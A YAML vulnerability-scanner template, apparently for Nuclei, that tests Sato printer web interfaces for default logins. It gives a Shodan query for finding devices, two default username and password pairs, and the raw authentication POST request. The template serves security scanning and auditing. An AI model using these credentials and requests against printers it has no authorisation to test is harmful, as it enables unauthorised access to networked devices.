id: sato-default-login
info:
  name: Sato - Default Login
  author: y0no
  severity: high
  description: |
    Sato using default credentials was discovered.
  metadata:
    runzero-match: any(each(service["html.titles"]), {# matches "Sato"})
    max-request: 1
    shodan-query: title:"Sato"
    verified: true
  tags: default-login,printer,sato,vuln
http:
  - attack: pitchfork
    matchers:
      - condition: and
        part: body
        type: word
        words:
          - '"r":0'
          - groups":["user
      - part: content_type
        type: word
        words:
          - application/json
      - status:
          - 200
        type: status
    matchers-condition: and
    payloads:
      password:
        - "0310"
        - "6677"
      username:
        - settings
        - service
    raw:
      - |
        POST /WebConfig/lua/auth.lua HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Referer: {{BaseURL}}

        group={{username}}&pw={{password}}
